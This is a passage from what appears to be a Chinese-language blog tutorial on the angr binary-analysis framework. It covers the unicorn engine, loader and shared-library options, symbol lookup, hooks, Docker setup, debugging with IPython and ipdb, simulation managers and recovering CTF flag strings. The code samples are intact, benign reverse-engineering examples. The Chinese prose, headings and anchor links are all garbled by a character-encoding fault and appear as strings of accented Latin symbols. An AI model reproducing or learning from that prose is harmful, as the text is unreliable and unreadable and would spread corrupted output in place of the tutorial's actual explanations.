<p>unicornå¼•æ“å¯èƒ½å¯ä»¥åŠ å¿«è¿è¡Œé€Ÿåº¦ï¼Œæœ‰æ—¶å€™ä¹Ÿä¼šæ”¾æ…¢é€Ÿåº¦ï¼Œå°±æ¯”å¦‚åœ¨åªæœ‰ä¸€æ¡è·¯å¾„ï¼Œä½†æ˜¯éœ€è¦æ·»åŠ flagçº¦æŸçš„ï¼š<code>asisctffinals2015_fake</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">initial_state = project.factory.full_init_state(</span><br><span class="line">    args=path_to_binary,</span><br><span class="line">    add_options=angr.options.unicorn,</span><br><span class="line">    stdin=flag,</span><br><span class="line">)</span><br></pre></td></tr></table></div></figure>


        <h3 id="â–²æ³¨ï¼š"   >
          <a href="#â–²æ³¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²æ³¨ï¼š" class="headerlink" title="â–²æ³¨ï¼š"></a>â–²æ³¨ï¼š</h3>
      <p>è¿™ç§ä»æœ€å¼€å§‹æ‰§è¡Œçš„æ–¹æ³•é€šå¸¸ç”¨åœ¨è·¯å¾„åˆ†æ”¯ä¸å¤šçš„æ—¶å€™ï¼Œå¦‚æœæ¯”è¾ƒå¤šå°±å®¹æ˜“è·¯å¾„çˆ†ç‚¸ã€‚</p>

        <h2 id="5-loader-åŠ è½½æ¨¡å—"   >
          <a href="#5-loader-åŠ è½½æ¨¡å—" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-loader-åŠ è½½æ¨¡å—" class="headerlink" title="5.loader åŠ è½½æ¨¡å—"></a>5.loader åŠ è½½æ¨¡å—</h2>
      <p>å°†äºŒè¿›åˆ¶æ–‡ä»¶åŠ è½½åˆ°è™šæ‹Ÿçš„åœ°å€ç©ºé—´</p>

        <h3 id="1-åŠ è½½äºŒè¿›åˆ¶é€‰é¡¹"   >
          <a href="#1-åŠ è½½äºŒè¿›åˆ¶é€‰é¡¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åŠ è½½äºŒè¿›åˆ¶é€‰é¡¹" class="headerlink" title="(1)åŠ è½½äºŒè¿›åˆ¶é€‰é¡¹"></a>(1)åŠ è½½äºŒè¿›åˆ¶é€‰é¡¹</h3>
      <p>åœ¨åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶æ—¶å¯ä»¥è®¾ç½®ç‰¹å®šçš„å‚æ•°ï¼Œä½¿ç”¨ <code>main_opts</code> å’Œ <code>lib_opts</code> å‚æ•°è¿›è¡Œè®¾ç½®ã€‚</p>
<ul>
<li><code>backend</code> - æŒ‡å®š backend</li>
<li><code>base_addr</code> - æŒ‡å®šåŸºå€</li>
<li><code>entry_point</code> - æŒ‡å®šå…¥å£ç‚¹</li>
<li><code>arch</code> - æŒ‡å®šæ¶æ„</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>angr.Project(<span class="string">&#x27;examples/fauxware/fauxware&#x27;</span>, main_opts=&#123;<span class="string">&#x27;backend&#x27;</span>: <span class="string">&#x27;blob&#x27;</span>, <span class="string">&#x27;arch&#x27;</span>: <span class="string">&#x27;i386&#x27;</span>&#125;, lib_opts=&#123;<span class="string">&#x27;libc.so.6&#x27;</span>: &#123;<span class="string">&#x27;backend&#x27;</span>: <span class="string">&#x27;elf&#x27;</span>&#125;&#125;)</span><br><span class="line">&lt;Project examples/fauxware/fauxware&gt;</span><br></pre></td></tr></table></div></figure>




        <h3 id="2-è·å–åŠ è½½å¯¹è±¡çš„ä¿¡æ¯"   >
          <a href="#2-è·å–åŠ è½½å¯¹è±¡çš„ä¿¡æ¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è·å–åŠ è½½å¯¹è±¡çš„ä¿¡æ¯" class="headerlink" title="(2)è·å–åŠ è½½å¯¹è±¡çš„ä¿¡æ¯"></a>(2)è·å–åŠ è½½å¯¹è±¡çš„ä¿¡æ¯</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj = proj.loader.main_object</span><br><span class="line">obj = proj.loader.all_objects</span><br><span class="line">obj.sections</span><br><span class="line">obj.plt</span><br><span class="line">obj.linked_base</span><br><span class="line">obj.mapped_base</span><br><span class="line">obj.max_addr</span><br></pre></td></tr></table></div></figure>




        <h3 id="3-ç¬¦å·å’Œé‡å®šä½ä¿¡æ¯"   >
          <a href="#3-ç¬¦å·å’Œé‡å®šä½ä¿¡æ¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ç¬¦å·å’Œé‡å®šä½ä¿¡æ¯" class="headerlink" title="(3)ç¬¦å·å’Œé‡å®šä½ä¿¡æ¯"></a>(3)ç¬¦å·å’Œé‡å®šä½ä¿¡æ¯</h3>
      
        <h4 id="â‘ ç¬¦å·å¯¹è±¡ä¿¡æ¯"   >
          <a href="#â‘ ç¬¦å·å¯¹è±¡ä¿¡æ¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ ç¬¦å·å¯¹è±¡ä¿¡æ¯" class="headerlink" title="â‘ ç¬¦å·å¯¹è±¡ä¿¡æ¯"></a>â‘ ç¬¦å·å¯¹è±¡ä¿¡æ¯</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">malloc = proj.loader.find_symbol(<span class="string">&#x27;malloc&#x27;</span>)</span><br><span class="line">malloc = proj.loader.main_object.get_symbol(<span class="string">&#x27;malloc&#x27;</span>)</span><br><span class="line"><span class="comment">#ä¹‹åå¯ä»¥ä½¿ç”¨mallocè¿™ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>malloc.</span><br><span class="line">malloc.is_common           malloc.is_local            malloc.owner_obj           malloc.resolvedby</span><br><span class="line">malloc.is_export           malloc.is_static           malloc.rebased_addr        malloc.size</span><br><span class="line">malloc.is_extern           malloc.is_weak             malloc.relative_addr       malloc.subtype</span><br><span class="line">malloc.is_forward          malloc.linked_addr         malloc.resolve(            malloc.<span class="built_in">type</span></span><br><span class="line">malloc.is_function         malloc.name                malloc.resolve_forwarder(  </span><br><span class="line">malloc.is_import           malloc.owner               malloc.resolved</span><br><span class="line">    </span><br><span class="line"><span class="comment">#è·å–ç¬¦å·å¯¹è±¡åœ°å€</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>malloc.rebased_addr</span><br><span class="line"><span class="number">0x10002c0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>malloc.linked_addr </span><br><span class="line"><span class="number">0x2c0</span>     </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>malloc.relative_addr</span><br><span class="line"><span class="number">0x2c0</span></span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡å…±äº«åº“ä¿¡æ¯"   >
          <a href="#â‘¡å…±äº«åº“ä¿¡æ¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡å…±äº«åº“ä¿¡æ¯" class="headerlink" title="â‘¡å…±äº«åº“ä¿¡æ¯"></a>â‘¡å…±äº«åº“ä¿¡æ¯</h4>
      <p>é€‰é¡¹</p>
<div class="table-container"><table>
<thead>
<tr>
<th><code>auto_load_libs</code></th>
<th>æ˜¯å¦è‡ªåŠ¨åŠ è½½ç¨‹åºçš„ä¾èµ–</th>
</tr>
</thead>
<tbody><tr>
<td><code>skip_libs</code></td>
<td>é¿å…åŠ è½½çš„åº“</td>
</tr>
<tr>
<td><code>except_missing_libs</code></td>
<td>æ— æ³•è§£æå…±äº«åº“æ—¶æ˜¯å¦æŠ›å‡ºå¼‚å¸¸</td>
</tr>
<tr>
<td><code>force_load_libs</code></td>
<td>å¼ºåˆ¶åŠ è½½çš„åº“</td>
</tr>
<tr>
<td><code>ld_path</code></td>
<td>å…±äº«åº“çš„ä¼˜å…ˆæœç´¢æœå¯»è·¯å¾„</td>
</tr>
</tbody></table></div>
<p>ä¿¡æ¯</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj = angr.Project(<span class="string">&#x27;/bin/true&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.loader.shared_objects</span><br><span class="line">OrderedDict([(<span class="string">&#x27;true&#x27;</span>, &lt;ELF Object true, maps [<span class="number">0x400000</span>:<span class="number">0x60721f</span>]&gt;), (<span class="string">&#x27;libc.so.6&#x27;</span>, &lt;ELF Object libc-<span class="number">2.27</span>.so, maps [<span class="number">0x1000000</span>:<span class="number">0x13f0adf</span>]&gt;), (<span class="string">&#x27;ld-linux-x86-64.so.2&#x27;</span>, &lt;ELF Object ld-<span class="number">2.27</span>.so, maps [<span class="number">0x2000000</span>:<span class="number">0x222916f</span>]&gt;)])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj = angr.Project(<span class="string">&#x27;/bin/true&#x27;</span>, load_options=&#123;<span class="string">&quot;auto_load_libs&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.loader.shared_objects</span><br><span class="line">OrderedDict([(<span class="string">&#x27;true&#x27;</span>, &lt;ELF Object true, maps [<span class="number">0x400000</span>:<span class="number">0x60721f</span>]&gt;)])</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¢Libcå‡½æ•°ä¿¡æ¯"   >
          <a href="#â‘¢Libcå‡½æ•°ä¿¡æ¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢Libcå‡½æ•°ä¿¡æ¯" class="headerlink" title="â‘¢Libcå‡½æ•°ä¿¡æ¯"></a>â‘¢Libcå‡½æ•°ä¿¡æ¯</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>angr.procedures.libc.malloc</span><br><span class="line">&lt;module <span class="string">&#x27;angr.procedures.libc.malloc&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/home/angr/angr-dev/angr/angr/procedures/libc/malloc.py&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">angr</span>.<span class="title">procedures</span>.<span class="title">libc</span>.<span class="title">malloc</span>.<span class="title">malloc</span>&#x27;&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="6-Hookä¿¡æ¯"   >
          <a href="#6-Hookä¿¡æ¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-Hookä¿¡æ¯" class="headerlink" title="6.Hookä¿¡æ¯"></a>6.Hookä¿¡æ¯</h2>
      <p>æŸ¥çœ‹hookç›¸å…³çš„ä¿¡æ¯</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stub_func = angr.SIM_PROCEDURES[<span class="string">&#x27;stubs&#x27;</span>][<span class="string">&#x27;ReturnUnconstrained&#x27;</span>] <span class="comment"># this is a CLASS</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.hook(<span class="number">0x10000</span>, stub_func())  <span class="comment"># hook with an instance of the class</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.is_hooked(<span class="number">0x10000</span>)            <span class="comment"># these functions should be pretty self-explanitory</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.hooked_by(<span class="number">0x10000</span>)</span><br><span class="line">&lt;ReturnUnconstrained&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.unhook(<span class="number">0x10000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>@proj.hook(<span class="number">0x20000</span>, length=<span class="number">5</span>)</span><br><span class="line"><span class="meta">... </span><span class="function"><span class="keyword">def</span> <span class="title">my_hook</span>(<span class="params">state</span>):</span></span><br><span class="line"><span class="meta">... </span>    state.regs.rax = <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.is_hooked(<span class="number">0x20000</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></div></figure>






        <h1 id="ä¸‰ã€å‘½ä»¤è¡Œä½¿ç”¨angr"   >
          <a href="#ä¸‰ã€å‘½ä»¤è¡Œä½¿ç”¨angr" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€å‘½ä»¤è¡Œä½¿ç”¨angr" class="headerlink" title="ä¸‰ã€å‘½ä»¤è¡Œä½¿ç”¨angr"></a>ä¸‰ã€å‘½ä»¤è¡Œä½¿ç”¨angr</h1>
      
        <h2 id="1-dockerç¯å¢ƒ"   >
          <a href="#1-dockerç¯å¢ƒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-dockerç¯å¢ƒ" class="headerlink" title="1.dockerç¯å¢ƒ"></a>1.dockerç¯å¢ƒ</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -it --rm -v $PWD/myTest:/myTest angr/angr</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-å‰æœŸå‡†å¤‡"   >
          <a href="#2-å‰æœŸå‡†å¤‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å‰æœŸå‡†å¤‡" class="headerlink" title="2.å‰æœŸå‡†å¤‡"></a>2.å‰æœŸå‡†å¤‡</h2>
      
        <h3 id="1-è¿›å…¥angr"   >
          <a href="#1-è¿›å…¥angr" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è¿›å…¥angr" class="headerlink" title="(1)è¿›å…¥angr"></a>(1)è¿›å…¥angr</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">project = angr.Project(<span class="string">&quot;/myTest/callBinaryFunc&quot;</span>)</span><br><span class="line"><span class="comment">#ä½¿ç”¨unicornå¼•æ“</span></span><br><span class="line">initial_state = project.factory.entry_state(add_options=angr.options.unicorn)</span><br><span class="line">logging.getLogger(<span class="string">&#x27;angr&#x27;</span>).setLevel(logging.INFO)</span><br><span class="line"><span class="comment">#ç°åœ¨å°±æ˜¯åœåœ¨startå‡½æ•°çš„å…¥å£</span></span><br><span class="line"><span class="built_in">hex</span>(initial_state.addr)</span><br></pre></td></tr></table></div></figure>




        <h2 id="3-ä¸­æœŸè°ƒè¯•"   >
          <a href="#3-ä¸­æœŸè°ƒè¯•" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ä¸­æœŸè°ƒè¯•" class="headerlink" title="3.ä¸­æœŸè°ƒè¯•"></a>3.ä¸­æœŸè°ƒè¯•</h2>
      
        <h3 id="1-ä¸­æ–­è°ƒè¯•"   >
          <a href="#1-ä¸­æ–­è°ƒè¯•" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¸­æ–­è°ƒè¯•" class="headerlink" title="(1)ä¸­æ–­è°ƒè¯•"></a>(1)ä¸­æ–­è°ƒè¯•</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">&#x27;angr&#x27;</span>).setLevel(logging.INFO)</span><br><span class="line"><span class="comment">#from pwn import*</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook</span>(<span class="params">l=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> l:</span><br><span class="line">        <span class="built_in">locals</span>().update(l)</span><br><span class="line">    <span class="keyword">import</span> IPython</span><br><span class="line">    IPython.embed(banner1=<span class="string">&#x27;&#x27;</span>,confirm_exit=<span class="literal">False</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç„¶ååœ¨éœ€è¦ä¸­æ–­çš„åœ°æ–¹è°ƒç”¨è¯¥å‡½æ•°å³å¯</span></span><br><span class="line">hook(<span class="built_in">locals</span>())</span><br></pre></td></tr></table></div></figure>

<p>æˆ–è€…ä½¿ç”¨ipdb</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ipdb</span><br><span class="line"></span><br><span class="line"><span class="comment">#åœ¨éœ€è¦æ–­ç‚¹çš„åœ°æ–¹ä¸‹æ–­ç‚¹å³å¯</span></span><br><span class="line">ipdb.set_trace()</span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨æ‰‹å†Œ</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">h(help)ï¼šå¸®åŠ©å‘½ä»¤</span><br><span class="line">s(step into)ï¼šè¿›å…¥å‡½æ•°å†…éƒ¨</span><br><span class="line">n(next)ï¼šæ‰§è¡Œä¸‹ä¸€è¡Œ</span><br><span class="line">b(break): b line_number æ‰“æ–­ç‚¹</span><br><span class="line">cl(clear): æ¸…é™¤æ–­ç‚¹</span><br><span class="line">c(continue): ä¸€ç›´æ‰§è¡Œåˆ°æ–­ç‚¹</span><br><span class="line">r(return): ä»å½“å‰å‡½æ•°è¿”å›</span><br><span class="line">j(jump): j line_numberï¼Œè·³è¿‡ä»£ç ç‰‡æ®µï¼Œç›´æ¥æ‰§è¡ŒæŒ‡å®šè¡Œå·æ‰€åœ¨çš„ä»£ç </span><br><span class="line">l(list): åˆ—å‡ºä¸Šä¸‹æ–‡ä»£ç </span><br><span class="line">a(argument): åˆ—å‡ºä¼ å…¥å‡½æ•°æ‰€æœ‰çš„å‚æ•°å€¼</span><br><span class="line">p/pp: print å’Œ pretty print æ‰“å°å‡ºå˜é‡å€¼</span><br><span class="line">r(restart): é‡å¯è°ƒè¯•å™¨</span><br><span class="line">q(quit): æ¨å‡ºè°ƒè¯•ï¼Œæ¸…é™¤æ‰€æœ‰ä¿¡æ¯</span><br></pre></td></tr></table></div></figure>




        <h3 id="2-angrç®¡ç†å™¨"   >
          <a href="#2-angrç®¡ç†å™¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-angrç®¡ç†å™¨" class="headerlink" title="(2)angrç®¡ç†å™¨"></a>(2)angrç®¡ç†å™¨</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è·å–è·¯å¾„ç®¡ç†å™¨ï¼Œä»å…¥å£å¼€å§‹è¿è¡Œ</span></span><br><span class="line">sm = project.factory.simulation_manager()</span><br><span class="line">sm.run()</span><br><span class="line"></span><br><span class="line"><span class="comment">#æˆ–è€…å¦‚ä¸‹è®¾ç½®ï¼Œè®¾ç½®åˆå§‹çŠ¶æ€å’Œå…¥å£åœ°å€ï¼Œä»è¯¥çŠ¶æ€å¼€å§‹æ¢ç´¢ï¼Œç›´åˆ°find</span></span><br><span class="line">initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line">simulation = project.factory.simgr(initial_state,veritesting=<span class="literal">True</span>)</span><br><span class="line">simulation.explore(find=success_address)</span><br></pre></td></tr></table></div></figure>

<p>ä»¥ä¸‹ä¸ºè¿è¡Œä¹‹åå¯èƒ½çš„çŠ¶æ€è·¯å¾„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111250.png" alt="image-20211208111243588"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111727.png" alt="image-20211208111727739"></p>
<p>ç„¶åå³å¯é€šè¿‡çŠ¶æ€æ¥æŸ¥çœ‹å½“å‰çŠ¶æ€çš„ä¸­çš„å„ç§å†…å­˜ï¼Œå¯„å­˜å™¨ç­‰</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111922.png" alt="image-20211208111922248"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111957.png" alt="image-20211208111957281"></p>

        <h3 id="3-è·å–å½“å‰å—ç›¸å…³ä¿¡æ¯"   >
          <a href="#3-è·å–å½“å‰å—ç›¸å…³ä¿¡æ¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è·å–å½“å‰å—ç›¸å…³ä¿¡æ¯" class="headerlink" title="(3)è·å–å½“å‰å—ç›¸å…³ä¿¡æ¯"></a>(3)è·å–å½“å‰å—ç›¸å…³ä¿¡æ¯</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æŸ¥çœ‹blockç›¸å…³ä¿¡æ¯</span></span><br><span class="line">block = state.block()</span><br><span class="line">block.capstone.pp()</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211207175459.png" alt="image-20211207175452322"></p>

        <h3 id="4-è°ƒè¯•core"   >
          <a href="#4-è°ƒè¯•core" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-è°ƒè¯•core" class="headerlink" title="(4)è°ƒè¯•core"></a>(4)è°ƒè¯•core</h3>
      <p>ä¸€èˆ¬è€Œè¨€ï¼Œcoreå¯ä»¥ä»gdbä¸­è·å¾—ï¼Œå¾—åˆ°å½“å‰gdbçŠ¶æ€çš„æ‰€æœ‰æ•°æ®ï¼ŒåŒ…æ‹¬åŠ è½½çš„libcå‡½æ•°ç­‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¸­è·å¾—ç›¸å…³çš„æ•°æ®æ¥åˆå§‹åŒ–æˆ‘ä»¬çš„state</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208155507.png" alt="image-20211208155507602"></p>
<p>ç„¶åå°±å¯ä»¥å¯¹åº”è°ƒè¯•äº†ï¼Œè®¾ç½®è¿˜æ˜¯ä¸€æ ·çš„è®¾ç½®ï¼Œåªä¸è¿‡åœ°å€ç›´æ¥å˜æˆå½“å‰çš„gdbä¸­çš„åœ°å€å³å¯ã€‚å¯ä»¥çœ‹åˆ°æ‰€æœ‰å†…å­˜åŸºæœ¬ä¸€è‡´ï¼Œåªæœ‰rbp,rspç­‰æ ˆæŒ‡é’ˆä¸å¤ªä¸€æ ·ï¼Œè¿™æ ·æ¯”è¾ƒæ–¹ä¾¿æˆ‘ä»¬æ¥è·å–æ•°æ®è°ƒè¯•ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208155815.png" alt="image-20211208155814628"></p>

        <h3 id="5-ç»§ç»­æ¢ç´¢"   >
          <a href="#5-ç»§ç»­æ¢ç´¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-ç»§ç»­æ¢ç´¢" class="headerlink" title="(5)ç»§ç»­æ¢ç´¢"></a>(5)ç»§ç»­æ¢ç´¢</h3>
      <p>å½“ä½¿ç”¨è¿‡çš„<code>simulation</code>æƒ³æ¥ç€æŸä¸ªçŠ¶æ€ç»§ç»­æ¢ç´¢æ—¶ï¼Œç›´æ¥ä½¿ç”¨ä»¥ä¸‹ä»£ç ä¸ä¼šæˆåŠŸ</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simulation.explore(find = addr)</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ—¶å€™éœ€è¦è·å–å½“å‰<code>simulation</code>çš„çŠ¶æ€<code>state</code>ï¼Œç„¶åä¾æ®è¯¥çŠ¶æ€<code>state</code>æ–°å»ºä¸€ä¸ª<code>newSimulation</code>æ‰èƒ½ç»§ç»­æ¢ç´¢</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nextFind</span>(<span class="params">project,state,find=<span class="number">0</span>,avoid=<span class="number">0</span></span>):</span></span><br><span class="line">    simulation = project.factory.simgr(state,veritesting=<span class="literal">True</span>)</span><br><span class="line">    simulation.explore(find = find,avoid = avoid)</span><br><span class="line">    <span class="keyword">return</span> simulation</span><br></pre></td></tr></table></div></figure>







<p>â–²TIPS</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è¾“å…¥ï¼Ÿè·å–å¸®åŠ©</span></span><br><span class="line">p.factory.simulation_manager?</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>



<p>1.è·å–å­—ç¬¦ä¸²</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è½¬æˆbyteç±»å‹çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">#sm = p.factory.simulation_manager()</span></span><br><span class="line"><span class="comment">#sm.step()</span></span><br><span class="line"><span class="comment">#state = sm.active[0]</span></span><br><span class="line">flag = state.mem[addr].string</span><br><span class="line">flag.concrete</span><br><span class="line"></span><br><span class="line">sm.deadended[<span class="number">1</span>].posix.stdout.concretize()</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211207180744.png" alt="image-20211207180744674"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111616.png" alt="image-20211208111616726"></p>

        <h1 id="TIPS"   >
          <a href="#TIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1>
      
        <h2 id="1-æ±‚å€¼é—®é¢˜"   >
          <a href="#1-æ±‚å€¼é—®é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ±‚å€¼é—®é¢˜" class="headerlink" title="1.æ±‚å€¼é—®é¢˜"></a>1.æ±‚å€¼é—®é¢˜</h2>
      
        <h3 id="1-æ±‚BVVç¬¦å·å€¼"   >
          <a href="#1-æ±‚BVVç¬¦å·å€¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ±‚BVVç¬¦å·å€¼" class="headerlink" title="(1)æ±‚BVVç¬¦å·å€¼"></a>(1)æ±‚BVVç¬¦å·å€¼</h3>
